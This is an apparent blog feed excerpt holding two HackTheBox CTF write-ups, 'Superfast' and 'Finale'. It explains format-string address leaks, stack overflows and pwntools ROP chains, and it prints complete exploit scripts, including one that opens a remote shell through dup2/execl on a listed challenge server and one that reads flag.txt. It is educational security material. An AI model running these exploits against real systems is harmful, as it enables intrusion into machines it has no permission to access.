gdb.debug(args=[&apos;php&apos;, &apos;-t&apos;, &apos;./pwn_superfast/challenge&apos;, &apos;-dextension=./pwn_superfast/challenge/php_logger.so&apos;, &apos;-S&apos;, &apos;0.0.0.0:1337&apos;], gdbscript=&apos;continue&apos;)
time.sleep(5)

xorkey = 1

s = requests.session()
headers = {&quot;cmd-key&quot;: str(xorkey)}

payload = b&quot;A&quot;*152 + b&quot;\x40&quot;
content = s.get(b&quot;http://127.0.0.1:1337?cmd=&quot;+payload, headers=headers).content
print(hex(u64(content[63:].ljust(8, b&apos;\x00&apos;))))

time.sleep(999)
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Script for debugging using GDB</span></p></figcaption></figure><p>Since that is useless, we need to find another way to leak addresses. To do that, we can utilize the fact that we&apos;re calling <code>printf()</code>. By supplying a payload like <code>%08x %08x %08x %08x</code> we can leak the stack. By trial and error, I found out that we can leak the stack, php_logger.so and the PHP binary using the format string <code>%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_</code>. Using the following payload, we can see the following leaks:</p><figure class="kg-card kg-code-card"><pre><code>php @ 0x55c720a64000
php_logger.so @ 0x7f609866e000
stack @ 0x7fff10fbd480</code></pre><figcaption><p><span style="white-space: pre-wrap;">Output of the script</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import xor, u64, gdb
import requests
import time

gdb.debug(args=[&apos;php&apos;, &apos;-t&apos;, &apos;./pwn_superfast/challenge&apos;, &apos;-dextension=./pwn_superfast/challenge/php_logger.so&apos;, &apos;-S&apos;, &apos;0.0.0.0:1337&apos;], gdbscript=&apos;continue&apos;)

time.sleep(3)

xorkey = 0x4
s = requests.session()
headers = {&quot;cmd-key&quot;: str(xorkey)}

fmt = b&apos;%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_&apos;
payload = xor(fmt + b&quot;A&quot;*(152 - len(fmt)), xorkey) + b&quot;\x40&quot;
url = b&quot;http://127.1:1337/index.php?cmd=&quot; + payload
print(url)

content = s.get(url, headers=headers).content
addresses = content.split(b&quot;_&quot;)

php_base = int(addresses[5], 16)-0x55e240
logger_base = int(addresses[8], 16)-0x1445
stack = int(addresses[0], 16)

print(&quot;php @&quot;, hex(php_base))
print(&quot;php_logger.so @&quot;, hex(logger_base))
print(&quot;stack @&quot;, hex(stack))

time.sleep(999)
</code></pre><figcaption><p><span style="white-space: pre-wrap;">Payload for leaking addresses</span></p></figcaption></figure><p>We have the needed primitives, so we can develop the ROP chain.</p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Now we can use pwntools&apos; ELF classes in order to make automatic ROP-chains. Using pwntools&apos; ELF class we can see that the <code>execl</code> function in the PLT section of the <code>php</code> binary. This means we can use it to spawn a shell. Our strategy is:</p><ol><li>Leaking the address of the PHP binary and the <code>php_logger.so</code> in memory.</li><li>dup2(4, N) to set stdin, stdout and stderr file descriptors to the TCP connection file descriptor for the webserver. </li><li> execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 0) to spawn the /bin/sh executable</li></ol><p>We can generate a ROP chain automatically with pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">rop = ROP(php)

&apos;&apos;&apos;
fd[0]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[1]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[2]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[3]      tcp 0.0.0.0:1337 =&gt; 0.0.0.0:0 (listen)
fd[4]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
&apos;&apos;&apos;

# set connection socket to stdin/stdout/stderr
rop.call(&apos;dup2&apos;, [4, 0])
rop.call(&apos;dup2&apos;, [4, 1])
rop.call(&apos;dup2&apos;, [4, 2])

binsh = next(php.search(b&quot;/bin/sh\x00&quot;))

rop.call(&apos;execl&apos;, [binsh, binsh, 0])
print(rop.dump())</code></pre><figcaption><p><span style="white-space: pre-wrap;">Python code for generating the ROP chain</span></p></figcaption></figure><p>Which gives the following ROP chain:</p><figure class="kg-card kg-code-card"><pre><code>0x0000:   0x56244b60816b pop rdi; ret
0x0008:              0x4 [arg0] rdi = 4
0x0010:   0x56244b6043fc pop rsi; ret
0x0018:              0x0 [arg1] rsi = 0
0x0020:   0x56244b601be0 dup2
0x0028:   0x56244b60816b pop rdi; ret
0x0030:              0x4 [arg0] rdi = 4
0x0038:   0x56244b6043fc pop rsi; ret
0x0040:              0x1 [arg1] rsi = 1
0x0048:   0x56244b601be0 dup2
0x0050:   0x56244b60816b pop rdi; ret
0x0058:              0x4 [arg0] rdi = 4
0x0060:   0x56244b6043fc pop rsi; ret
0x0068:              0x2 [arg1] rsi = 2
0x0070:   0x56244b601be0 dup2
0x0078:   0x56244b60816b pop rdi; ret
0x0080:   0x56244bd03fc3 [arg0] rdi = 94713890750403
0x0088:   0x56244b60487c pop rdx; ret
0x0090:              0x0 [arg2] rdx = 0
0x0098:   0x56244b6043fc pop rsi; ret
0x00a0:   0x56244bd03fc3 [arg1] rsi = 94713890750403
0x00a8:   0x56244b6042d0 execl
</code></pre><figcaption><p><span style="white-space: pre-wrap;">ROP chain generated by pwntools</span></p></figcaption></figure><p>As we can see, it does the following:</p><figure class="kg-card kg-code-card"><pre><code>dup(4, 0)
dup(4, 1)
dup(4, 2)
execl(&quot;/bin/sh&quot;, &quot;/bin/sh&quot;, 0)</code></pre><figcaption><p><span style="white-space: pre-wrap;">C representation of the ROP chain</span></p></figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>I coded the following script to utilize the ROP chain. If we run this, we get a shell on the box. </p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import xor, u64, gdb, ELF, p64, remote, ROP, context
import requests
import time
import urllib

#gdb.debug(args=[&apos;/usr/bin/php&apos;, &apos;-t&apos;, &apos;./pwn_superfast/challenge&apos;, &apos;-dextension=./pwn_superfast/challenge/php_logger.so&apos;, &apos;-S&apos;, &apos;0.0.0.0:1337&apos;], gdbscript=&apos;continue&apos;)
#time.sleep(5)

target_ip = b&quot;161.35.173.232&quot;
target_port = b&quot;31302&quot;

target_host = b&quot;http://&quot; + target_ip + b&quot;:&quot; + target_port

s = requests.session()
headers = {&quot;cmd-key&quot;: &quot;1&quot;}

fmt = b&apos;%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_%llx_&apos;
payload = xor(fmt + b&quot;A&quot;*(152 - len(fmt)), 1) + b&quot;\x40&quot;

print(&quot;[*] sending payload...&quot;)
content = s.get(target_host + b&quot;/index.php?cmd=&quot; + payload, headers=headers).content
addresses = content.split(b&quot;_&quot;)

print(&quot;[*] loading addresses...&quot;)
# set context for ROP()
#context.binary = php = ELF(&apos;/usr/bin/php&apos;, checksec=False)
context.binary = php = ELF(&apos;./php&apos;, checksec=False)
php.address = int(addresses[5], 16) - php.sym.executor_globals

php_logger = ELF(&apos;pwn_superfast/challenge/php_logger.so&apos;, checksec=False)
php_logger.address = int(addresses[8], 16)-0x1445
stack = int(addresses[0], 16)

print(&quot;[+] php @&quot;, hex(php.address))
print(&quot;[+] php_logger.so @&quot;, hex(php_logger.address))
print(&quot;[+] stack @&quot;, hex(stack))

rop = ROP(php)

&apos;&apos;&apos;
fd[0]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[1]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[2]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
fd[3]      tcp 0.0.0.0:1337 =&gt; 0.0.0.0:0 (listen)
fd[4]      tcp 172.17.0.1:1337 =&gt; 10.64.190.187:42088 (established)
&apos;&apos;&apos;

# set connection socket to stdin/stdout/stderr
rop.call(&apos;dup2&apos;, [4, 0])
rop.call(&apos;dup2&apos;, [4, 1])
rop.call(&apos;dup2&apos;, [4, 2])

binsh = next(php.search(b&quot;/bin/sh\x00&quot;))

rop.call(&apos;execl&apos;, [binsh, binsh, 0])
print(rop.dump())

payload = b&apos;A&apos;*152 + rop.chain()
http = &quot;GET /index.php?cmd=&quot; + urllib.parse.quote(payload) + &quot; HTTP/1.1\n&quot;
http += &quot;Cmd-Key: 1\n\n&quot;

print(&quot;[*] sending payload for shell...&quot;)
p = remote(target_ip, int(target_port))
p.send(http.encode())
p.interactive()

time.sleep(999)</code></pre><figcaption><p><span style="white-space: pre-wrap;">Python script for retrieving the flag</span></p></figcaption></figure><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ python3 script.py
[*] sending payload...
[*] loading addresses...
[+] php @ 0x55da3ce00000
[+] php_logger.so @ 0x7fb906c50000
[+] stack @ 0x7ffee56eddc0
[*] Loaded 327 cached gadgets for &apos;./php&apos;
0x0000:   0x55da3d00816b pop rdi; ret
0x0008:              0x4 [arg0] rdi = 4
0x0010:   0x55da3d0043fc pop rsi; ret
0x0018:              0x0 [arg1] rsi = 0
0x0020:   0x55da3d001be0 dup2
0x0028:   0x55da3d00816b pop rdi; ret
0x0030:              0x4 [arg0] rdi = 4
0x0038:   0x55da3d0043fc pop rsi; ret
0x0040:              0x1 [arg1] rsi = 1
0x0048:   0x55da3d001be0 dup2
0x0050:   0x55da3d00816b pop rdi; ret
0x0058:              0x4 [arg0] rdi = 4
0x0060:   0x55da3d0043fc pop rsi; ret
0x0068:              0x2 [arg1] rsi = 2
0x0070:   0x55da3d001be0 dup2
0x0078:   0x55da3d00816b pop rdi; ret
0x0080:   0x55da3d703fc3 [arg0] rdi = 94395821998019
0x0088:   0x55da3d00487c pop rdx; ret
0x0090:              0x0 [arg2] rdx = 0
0x0098:   0x55da3d0043fc pop rsi; ret
0x00a0:   0x55da3d703fc3 [arg1] rsi = 94395821998019
0x00a8:   0x55da3d0042d0 execl
[*] sending payload for shell...
[+] Opening connection to b&apos;161.35.173.232&apos; on port 31302: Done
[*] Switching to interactive mode
sh: turning off NDELAY mode
$ whoami
ctf</code></pre><figcaption><p><span style="white-space: pre-wrap;">Output of the exploit</span></p></figcaption></figure><p>Thanks for reading my write-up about the HackTheBox Business CTF 2022 Superfast challenge; I hope you learned as much as I did.</p>]]></content:encoded></item><item><title><![CDATA[Finale (HackTheBox)]]></title><description><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/finale">Finale</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>It&apos;s the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true!</blockquote>]]></description><link>https://pwning.tech/finale/</link><guid isPermaLink="false">658f44f8d32e980001de21e9</guid><category><![CDATA[Binary Exploitation]]></category><category><![CDATA[HackTheBoo]]></category><category><![CDATA[HackTheBox challenges]]></category><category><![CDATA[ROP chains]]></category><category><![CDATA[x64 Assembly]]></category><category><![CDATA[Stack memory]]></category><dc:creator><![CDATA[notselwyn]]></dc:creator><pubDate>Sat, 26 Nov 2022 18:27:03 GMT</pubDate><content:encoded><![CDATA[<p>Hey all. Today we&apos;re going to discuss the retired <a href="https://app.hackthebox.com/challenges/finale">Finale</a> challenge on HackTheBox. The description on HackTheBox is as follows:</p><blockquote>It&apos;s the end of the season and we all know that the Spooktober Spirit will grant a souvenir to everyone and make their wish come true! Wish you the best for the upcoming year!</blockquote><p>In this write-up, we will learn about the <strong>stack, ROP chains</strong>, and prioritizing<strong> attack vectors</strong>. </p><p>Spoiler alert: if you can&apos;t find the libc version, it&apos;s not a bug. </p><h1 id="summary">Summary</h1><ul><li>First looks</li><li>Finding vulnerability primitives</li><li>Developing the ROP chain</li><li>Retrieving the flag</li><li>Failed attempt</li></ul><h1 id="first-looks">First looks</h1><p>We are given an executable binary called <code>finale</code>. Upon performing a dynamic analysis, we are prompted for a password which means that we&apos;ll need to do a static analysis in order to proceed. </p><figure class="kg-card kg-code-card"><pre><code class="language-bash">[Strange man in mask screams some nonsense]: iut2rxgf

[Strange man in mask]: In order to proceed, tell us the secret phrase: &lt;...&gt;

[Strange man in mask]: Sorry, you are not allowed to enter here!</code></pre><figcaption>The dynamic analysis</figcaption></figure><p>Running pwntools&apos; <code>checksec</code> on <code>finale</code> gives us:</p><figure class="kg-card kg-code-card"><pre><code class="language-bash">$ checksec finale
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
</code></pre><figcaption>Checksec output</figcaption></figure><p>The fields mean:</p><ul><li>Arch: the CPU architecture and instruction set (x86, ARM, MIPS, ...)</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/relro">RELRO</a>: Relocation Read-Only - secures the <a href="https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite">dynamic linking process</a></li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/canaries">Stack Canaries</a>: protects against stack buffer overflow attacks</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/no-execute">NX</a>: No eXecute - write-able memory cannot be executed</li><li><a href="https://ir0nstone.gitbook.io/notes/types/stack/pie">PIE</a>: Position Independable Executable - address randomization</li></ul><p>For a more in-depth conclusion about checksec, please visit our <a href="https://pwning.tech/blacksmith/">previous blogpost</a> about the Blacksmith challenge on Hack The Box. The logical conclusion is that we need to perform a stack-based buffer overflow (since Stack Canaries are disabled) leading to a Return-Oriented-Programming chain (since NX is enabled). </p><h1 id="finding-vulnerability-primitives">Finding vulnerability primitives</h1><p>To start, a vulnerability primitive is a building block of an exploit. A primitive can be bundled with other primitives to achieve a higher impact.</p><h3 id="main-analysis">Main() analysis</h3><p>In order to analyze the binary, I opened it up in <a href="https://github.com/NationalSecurityAgency/ghidra">Ghidra</a>, made by the NSA. The <code>main()</code> function prints 8 random bytes, asks us for a secret and calls <code>finale()</code>. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">long main()
{
  int iVar1;
  char secret [16];
  char rand [8];
  ulong i;
  
  banner();
  rand = 0;
  iVar1 = open(&quot;/dev/urandom&quot;,0);
  read(iVar1,rand,8);
  printf(&quot;\n[Strange man in mask screams some nonsense]: %s\n\n&quot;,rand);
  close(iVar1);
  secret._0_8_ = 0;
  secret._8_8_ = 0;
  printf(&quot;[Strange man in mask]: In order to proceed, tell us the secret phrase: &quot;);
  __isoc99_scanf(&quot;%16s&quot;,secret);
  i = 0;
  do {
    if (i &gt; 14) {
LAB_CHECK_SECRET:
      iVar1 = strncmp(secret,&quot;s34s0nf1n4l3b00&quot;,15);
      if (iVar1 == 0) {
        finale();
      } else {
        printf(&quot;%s\n[Strange man in mask]: Sorry, you are not allowed to enter here!\n\n&quot;,&quot;\x1b[1;31m&quot;);
      }
      return;
    }
    if (secret[i] == &apos;\n&apos;) {
      secret[i] = &apos;\0&apos;;
      goto LAB_CHECK_SECRET;
    }
    i++;
  } while( true );
}

</code></pre><figcaption>Main function</figcaption></figure><p>As we can see, the secret for the binary is <code>s34s0nf1n4l3b00</code> and <code>finale()</code> gets called after the correct secret has been entered. </p><h3 id="finale-analysis">Finale() analysis</h3><p>As said, <code>main()</code> calls <code>finale()</code> after the secret has been entered. This function asks us for a wish for the next year. </p><figure class="kg-card kg-code-card"><pre><code class="language-c">void finale()
{
  char buf[64];
  
  printf(&quot;\n[Strange man in mask]: Season finale is here! Take this souvenir with you for good luck: [%p]&quot;,buf);
  printf(&quot;\n\n[Strange man in mask]: Now, tell us a wish for next year: &quot;);
  fflush(stdin);
  fflush(stdout);
  read(0,buf,0x1000);
  write(1,&quot;\n[Strange man in mask]: That\&apos;s a nice wish! Let the Spooktober Spirit be with you!\n\n&quot;,0x54);
  return;
}</code></pre><figcaption>Finale function</figcaption></figure><p>We are given stack leak in the form of <code>char* buf</code>. Furthermore, there is a stack buffer overflow: the buffer length is 64 and we are writing 0x1000 (4096) bytes. In Ghidra we can see that the offset to the return address from the base of <code>buf</code> is <strong>0x48</strong> bytes.</p><figure class="kg-card kg-image-card"><img src="https://pwning.tech/content/images/2022/11/image.png" class="kg-image" alt loading="lazy" width="450" height="81"></figure><h3 id="got">GOT</h3><p>Considering checksec said <code>No PIE (0x400000)</code>, we can use the Procedural Linking Table (PLT) section of the binary. This means we could open a potential <code>flag.txt</code> using <code>open()</code>, <code>read()</code> and <code>write()</code>. </p><h1 id="developing-the-rop-chain">Developing the ROP chain</h1><p>Considering the protections in the binary listed by checksec state that No eXecute is enabled, we need to use <strong>Return Oriented Programming (ROP) chains</strong>. We want to do the following in the payload:</p><pre><code class="language-c">fd = open(&quot;flag.txt&quot;, 0);
n_read = read(3, buf, size);  // 3 since fd == 3 can be expected
write(1, buf, n_read);</code></pre><p>We have access to:</p><ul><li>Binary/ELF</li><li> &#xA0; GOT and PLT (linked functions)</li><li>&#x2003;Functions (built-in functions)</li><li>Stack</li></ul><p>Using <code>print(*ELF(&apos;challenge/finale&apos;).plt.keys())</code>, we can see that the following functions are available in the PLT sections:</p><figure class="kg-card kg-code-card"><pre><code>strncmp puts write printf alarm
close read srand time fflush
setvbuf open __isoc99_scanf rand</code></pre><figcaption>Available functions in the PLT section</figcaption></figure><p>Now we have the right functions and have access to the stack (for &quot;flag.txt&quot;), we need to need a way to pass function arguments. The x64 calling convention states that function arguments should be passed (in order) via RDI, RSI, RDX, RCX, R8, R9. This means that we need to control the <strong>RDI</strong>, <strong>RSI</strong>, and <strong>RDX</strong> registers via <strong>pop instructions</strong> (called <strong>gadgets</strong>) in the <strong>ROP-chain</strong> in order to pass <strong>3</strong> arguments to <code>open()</code>, <code>read()</code>, and <code>write()</code>. We can search for such gadgets using <a href="https://github.com/Ben-Lichtman/ropr">ropr</a>: a blazing fast multithreaded ROP Gadget finder. Below is my search regex filter for ropr:</p><pre><code class="language-bash">$ ropr -R &apos;^pop (rdi|rsi|rdx); ret;&apos; challenge/finale  
0x004012d6: pop rdi; ret;
0x004012d8: pop rsi; ret;
</code></pre><p>Sadly, ropr <strong>can&apos;t find</strong> any gadgets for the <strong>RDX</strong> register. Even after trying many more search queries (like <strong>EDX </strong>and <strong>DX</strong>), I couldn&apos;t find any results. This means that we need to find a workaround for a high-enough RDX value for <code>read(..., ..., size=RDX)</code>.</p><h3 id="gnu-debugger-gdb">GNU Debugger (GDB)</h3><p>In order to find out a way to get a high RDX value, I used GDB with the <a href="https://github.com/pwndbg/pwndbg">Pwndbg</a> plug-in (please say <code>/pwn-dbg/</code> and not <code>/po&#x28A;ndb&#xE6;g/</code> as the repo proposes). To see the RDX value during runtime, we can use the GDB functions in pwntools:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF(&apos;challenge/finale&apos;)
p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x4012d6)

# 0x004012d8: pop rsi; ret;
pop_rsi = p64(0x4012d8)

def leak_func(address):
    payload = b&apos;A&apos;*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)

    p.sendafter(b&quot;next year: &quot;, payload)
    p.recvuntil(b&quot;you!\n\n&quot;)  # clear buffer
    return u64(p.recvuntil(b&quot;\n&quot;)[:-1].ljust(8, b&apos;\x00&apos;))


p.sendlineafter(b&quot;secret phrase: &quot;, b&quot;s34s0nf1n4l3b00&quot;)
p.recvuntil(b&quot;good luck: [&quot;)  # clear buffer for next address read

leak = int(p.recvuntil(b&quot;]&quot;)[:-1], 16)
print(&quot;leak @&quot;, hex(leak))

file = b&apos;flag.txt\0&apos;
rbp = leak + 0x170

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(0x4014c7)

gdb.attach(p, &apos;b *0x4014c7\ncontinue&apos;)
p.sendafter(b&quot;next year: &quot;, payload)

while True:
    print(p.recv())
</code></pre><figcaption>Payload for opening GDB at the open() call</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>0x00000000004014e0 in main ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;[ REGISTERS / show-flags off / show-compact-regs off ]&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
 RAX  0x3
 RBX  0x0
 RCX  0x7ffc887475a0 &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
 RDX  0x8
*RDI  0x3
 RSI  0x7ffc887475a0 &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
 R8   0x3c
 R9   0x7ffc887451bc &#x25C2;&#x2014; 0x3c00007f76
 R10  0x0
 R11  0x246
 R12  0x7ffc887475f8 &#x2014;&#x25B8; 0x7ffc88748289 &#x25C2;&#x2014; &apos;~/Documents/ctf/htb/finale/challenge/finale&apos;
 R13  0x401492 (main) &#x25C2;&#x2014; endbr64 
 R14  0x403d70 (__do_global_dtors_aux_fini_array_entry) &#x2014;&#x25B8; 0x4012a0 (__do_global_dtors_aux) &#x25C2;&#x2014; endbr64 
 R15  0x7f76d739d040 (_rtld_global) &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
 RBP  0x7ffc887475c0 &#x2014;&#x25B8; 0x7ffc887475f0 &#x25C2;&#x2014; 0x1
 RSP  0x7ffc887474c0 &#x25C2;&#x2014; 0xe193b4642436643b
*RIP  0x4014e0 (main+78) &#x25C2;&#x2014; call 0x401170
&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;[ DISASM / x86-64 / set emulate on ]&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;&#x2500;
   0x4014cf &lt;main+61&gt;     lea    rcx, [rbp - 0x20]
   0x4014d3 &lt;main+65&gt;     mov    eax, dword ptr [rbp - 0xc]
   0x4014d6 &lt;main+68&gt;     mov    edx, 8
   0x4014db &lt;main+73&gt;     mov    rsi, rcx
   0x4014de &lt;main+76&gt;     mov    edi, eax
 &#x25BA; 0x4014e0 &lt;main+78&gt;     call   read@plt                      &lt;read@plt&gt;
        fd: 0x3 (~/Documents/ctf/htb/finale/flag.txt)
        buf: 0x7ffc887475a0 &#x2014;&#x25B8; 0x7f76d739e2e0 &#x25C2;&#x2014; 0x0
        nbytes: 0x8
 
   0x4014e5 &lt;main+83&gt;     lea    rax, [rbp - 0x20]
   0x4014e9 &lt;main+87&gt;     mov    rsi, rax
   0x4014ec &lt;main+90&gt;     lea    rax, [rip + 0x1425]
   0x4014f3 &lt;main+97&gt;     mov    rdi, rax
   0x4014f6 &lt;main+100&gt;    mov    eax, 0</code></pre><figcaption>GDB breakpoint dump</figcaption></figure><p>As we can see, RDX is equal to 8 which means only 8 bytes of the flag get read and written to stdout. Since we need to read at least 32 bytes, we need to find a way of manipulating the RDX register. We could do this by:</p><ul><li>Calling <code>open(&quot;flag.txt&quot;, 0)</code> using the PLT section in the ELF (which only executes the function and immediately returns after)</li><li><strong>Manipulate RDX</strong></li><li>Calling <code>0x4014e0</code> so we read() with the manipulated RDX and write() to stdout all at once.</li></ul><p>As said, I tried finding gadgets which sadly did not work. After manually analyzing the binary I happened to see the following gadget:</p><figure class="kg-card kg-code-card"><pre><code class="language-nasm">      00401476 ba 54 00     MOV       EDX,0x54
               00 00
      0040147b 48 8d 05     LEA       RAX,[s__[Strange_man_in_mask]:_That&apos;s_a_ = &quot;\n[Strange man in mask]: 
               2e 14 00 
               00
      00401482 48 89 c6     MOV       RSI=&gt;s__[Strange_man_in_mask]:_That&apos;s_a_ = &quot;\n[Strange man in mask]: 
      00401485 bf 01 00     MOV       EDI,0x1
               00 00
      0040148a e8 a1 fc     CALL      &lt;EXTERNAL&gt;::write                         ssize_t write(int __fd, void
               ff ff
      0040148f 90            NOP
      00401490 c9            LEAVE
      00401491 c3            RET
</code></pre><figcaption>Part of the finale() function</figcaption></figure><p>As we can see, the EDX register is set to 0x54. This means we will read and write 84 bytes of the flag, which means it&apos;s more than enough and that we have completed the final part of the ROP chain:</p><ul><li>open@PLT(&quot;flag.txt&quot;, 0)</li><li>finale() // to set RDX to 0x54</li><li>Set RDI to 3</li><li>Set RSI to the buffer buf</li><li>JMP <code>0x4016e0</code></li></ul><p>A.k.a.:</p><figure class="kg-card kg-code-card"><pre><code class="language-py">file = b&apos;flag.txt\0&apos;
rbp = leak - 0x5000

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(e.plt.open)
payload += p64(e.sym.finale)  # set RDX

p.sendafter(b&quot;next year: &quot;, payload)

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(3)
payload += pop_rsi + p64(rbp-0x20)
payload += p64(0x4014e0)  # read() -&gt; write()

p.sendafter(b&quot;next year: &quot;, payload)
</code></pre><figcaption>The Python representation of the ROP chain</figcaption></figure><h1 id="retrieving-the-flag">Retrieving the flag</h1><p>So, the grant scene of the script is:</p><pre><code class="language-py">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF(&apos;challenge/finale&apos;)
is_remote = False
if is_remote:
    p = remote(&quot;167.99.204.5&quot;, 31431)
else:
    p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x4012d6)

# 0x004012d8: pop rsi; ret;
pop_rsi = p64(0x4012d8)

def leak_func(address):
    payload = b&apos;A&apos;*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)

    p.sendafter(b&quot;next year: &quot;, payload)
    p.recvuntil(b&quot;you!\n\n&quot;)  # clear buffer
    return u64(p.recvuntil(b&quot;\n&quot;)[:-1].ljust(8, b&apos;\x00&apos;))


p.sendlineafter(b&quot;secret phrase: &quot;, b&quot;s34s0nf1n4l3b00&quot;)
p.recvuntil(b&quot;good luck: [&quot;)  # clear buffer for next address read

leak = int(p.recvuntil(b&quot;]&quot;)[:-1], 16)
print(&quot;leak @&quot;, hex(leak))

file = b&apos;flag.txt\0&apos;
rbp = leak - 0x5000

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(leak)
payload += pop_rsi + p64(0)
payload += p64(e.plt.open)
payload += p64(e.sym.finale)  # set RDX

p.sendafter(b&quot;next year: &quot;, payload)

payload = file + b&apos;A&apos;*(0x40-len(file)) + p64(rbp)
payload += pop_rdi + p64(3)
payload += pop_rsi + p64(rbp-0x20)
payload += p64(0x4014e0)  # read() -&gt; write()

p.sendafter(b&quot;next year: &quot;, payload)
while True:
    print(p.recv())
</code></pre><p></p><h1 id="failed-attempt">Failed attempt</h1><p>In my failed attempt I tried to get remote code execution using leaked libc offsets, but it turned out that the libc version on the server was custom and it was intended to prevent this solution. I had to find out by asking the creator of the challenge.</p><p>The way we leak libc addresses is by calling <code>puts()</code> in the PLT section with the argument being a libc function linked in the GOT section. So, we need to call <code>puts(const char *string);</code> with argument <code>string</code> via the <code>RDI</code> register in AMD64. To control the RDI register, we use a ROP chain that pops RDI:</p><pre><code class="language-bash">$ ropr -R &apos;pop rdi; ret;&apos; challenge/finale
0x004012d6: pop rdi; ret;

==&gt; Found 1 gadgets in 0.004 seconds</code></pre><p>Now we can pop a GOT function address into RDI and call <code>puts()</code> to leak the function offset. Let&apos;s run the following script with the server as target to get their libc version:</p><figure class="kg-card kg-code-card"><pre><code class="language-python3">#!/usr/bin/env python3

from pwn import ELF, remote, gdb, p64, u64
import time

e = ELF(&apos;challenge/finale&apos;)
is_remote = False
if is_remote: 
    p = remote(&quot;161.35.173.232&quot;, 31394)
else:
    p = e.process()

# 0x004012d6: pop rdi; ret;
pop_rdi = p64(0x004012d6)

def leak_func(address):
    payload = b&apos;A&apos;*0x48
    payload += pop_rdi + p64(address) + p64(e.plt.puts) + p64(e.sym.finale)
    
    p.sendafter(b&quot;next year: &quot;, payload)
    p.recvuntil(b&quot;you!\n\n&quot;)  # clear buffer
    return u64(p.recvuntil(b&quot;\n&quot;)[:-1].ljust(8, b&apos;\x00&apos;))

p.sendlineafter(b&quot;secret phrase: &quot;, b&quot;s34s0nf1n4l3b00&quot;)
p.recvuntil(b&quot;good luck: [&quot;)  # clear buffer for next address read

leak = int(p.recvuntil(b&quot;]&quot;)[:-1], 16)
print(&quot;leak @&quot;, hex(leak))

#gdb.attach(p)
for name, addr in e.got.items():
    print(name, &quot;@&quot;, hex(leak_func(addr)))
</code></pre><figcaption>The payload for leaking LIBC addresses</figcaption></figure><p>The output is the following:</p><pre><code>__libc_start_main @ 0x7ff2d7c29dc0
__gmon_start__ @ 0x0
stdout @ 0x7ff2d7e1a780
stdin @ 0x7ff2d7e19aa0
strncmp @ 0x0
puts @ 0x7ff2d7c80ed0
write @ 0x7ff2d7d14a20
printf @ 0x7ff2d7c60770
